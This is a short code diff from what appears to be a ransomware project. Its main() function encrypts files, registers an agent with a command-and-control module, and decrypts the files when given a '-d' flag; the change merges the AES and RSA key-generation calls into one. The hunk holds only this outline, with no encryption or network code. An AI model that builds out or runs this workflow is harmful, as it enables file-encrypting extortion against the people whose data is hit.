@@ -10,8 +10,7 @@ def main():
     if len(sys.argv) > 1 and sys.argv[1] == "-d":
         decrypt.descifrar_archivos()
     else:
-        gen_keys.generate_aes_key()
-        gen_keys.generate_rsa_key()
+        gen_keys.generate_keys()
         encrypt.cifrar_archivos()
         agent_c2.register_agent()
 
